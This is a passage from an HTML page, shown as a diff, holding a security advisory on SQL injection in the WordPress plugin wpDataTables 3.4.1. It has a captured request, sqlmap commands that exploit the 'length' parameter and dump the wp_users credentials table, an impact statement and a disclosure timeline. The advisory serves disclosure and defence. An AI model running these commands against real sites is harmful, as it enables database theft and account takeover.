+draw=1&amp;columns%5B0%5D%5Bdata%5D=0&amp;columns%5B0%5D%5Bname%5D=wdt_ID&amp;columns%5B0%5D%5Bsearchable%5D=true&amp;columns%5B0%5D%5Borderable%5D=true&amp;columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B1%5D%5Bdata%5D=1&amp;columns%5B1%5D%5Bname%5D=name&amp;columns%5B1%5D%5Bsearchable%5D=true&amp;columns%5B1%5D%5Borderable%5D=true&amp;columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B2%5D%5Bdata%5D=2&amp;columns%5B2%5D%5Bname%5D=price&amp;columns%5B2%5D%5Bsearchable%5D=true&amp;columns%5B2%5D%5Borderable%5D=true&amp;columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&amp;order%5B0%5D%5Bcolumn%5D=0&amp;order%5B0%5D%5Bdir%5D=asc&amp;start=0&amp;length=10&amp;search%5Bvalue%5D=&amp;search%5Bregex%5D=false&amp;currentUserId=1&amp;currentUserLogin=admin&amp;currentPostIdPlaceholder=&amp;currentUserFirstName=&amp;currentUserLastName=&amp;currentUserEmail=test%40mail.com&amp;currentDate=15%2F02%2F2021&amp;currentDateTime=15%2F02%2F2021+03%3A40+PM&amp;currentTime=03%3A40+PM&amp;wpdbPlaceholder=wp_&amp;wdtNonce=7a0d38fc5e&amp;showAllRows=on
+</code></pre>
+
+<p>Then, use the <a href="http://sqlmap.org"><strong>SQLMap</strong></a> tool to exploit the vulnerability with the following command:</p>
+
+<pre><code># Clear SQLMap local cache:
+rm -rf ~/.local/share/sqlmap
+sqlmap -r draw.txt --level=5 --risk=3 --random-agent --dbms=mysql --banner -p length --batch
+</code></pre>
+
+<p>The banner of the database is gathered as PoC of the vulnerability:</p>
+
+<p><img src="/images/2a2dfaf08a7be9042f4ef157424c8ada.png" alt="SQLMap - Banner" /></p>
+
+<p>It is possible to dump all the WordPress database to extract the credentials. If a successful password cracking attack is accomplished, an attacker can use the credentials to login to the WordPress admin page.<br />
+To extract the <strong>wp_users</strong> table, use the following command:</p>
+
+<pre><code>sqlmap -r draw.txt --level=5 --risk=3 --random-agent --dbms=mysql -p length -D wordpress -T wp_users --dump
+</code></pre>
+
+<p><img src="/images/5bbe2d163183e528ed12f244b5503d40.png" alt="SQLMap - Database dump" /></p>
+
+<p>The vulnerability is tested on wpDataTables version 3.4.1, as depicted by the following screenshot:</p>
+
+<p><img src="/images/db81e4598a66e10e267854e00bb9451a.png" alt="Vulnerable version confirmation - wpDataTables 3.4.1" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an attacker is able to access all the data in the database and obtain access to the WordPress application, because all the data, including WordPress credentials, can be extracted and cracked.<br />
+It is important to note that a valid WordPress administrator account is also able to execute Remote Code Execution attack because of the capability of installing or modifying existing plugins or themes via the web interface. This scenario allows the entire compromise of the target operating system where wpDataTables is installed.</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+<li><strong>22/02/2021</strong>: First disclosure via private ticket on the Technical Support Web Page.</li>
+<li><strong>23/02/2021</strong>: Ticket acknowledge e-mail from Technical Support!</li>
+<li><strong>05/02/2021</strong>: Ticket closed, and stated that the fix will be included in the next update. (Not so) kind regards&hellip;</li>
+<li><strong>10/03/2021</strong>: Released the version 3.4.2, which has the fix for the vulnerabilities. Check the <a href="https://wpdatatables.com/help/whats-new-changelog/">Changelog</a>.</li>
+<li><strong>16/03/2021</strong>: Requested CVEs to WPScan, as from 2021 it has been named a CNA for WordPress core, plugin and theme CVEs. Check <a href="https://wptavern.com/wpscan-can-now-assign-cve-numbers-for-wordpress-core-plugin-and-theme-vulnerabilities">here</a> for further information.</li>
+</ul>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="https://n4nj0.github.io/advisories/wordpress-plugin-wp-file-manager-i/"><i class="fa fa-chevron-circle-left"></i> WordPress Plugin WP File Manager - Reflected XSS</a>
+        </li>
+        
+        
+    </ul>
+</section>
+  
+    
+    
+  
+
+
+
+
+
+<footer>
+  <div>
+    <p>
+      <h6>
+      &copy; 2020 Veno Eivazian.
+      <a href="https://creativecommons.org/licenses/by/3.0/" title="Creative Commons Attribution">Some rights reserved</a>;
+      please attribute properly and link back.
+      </h6>
+    </p>
+  </div>
+</footer>
+
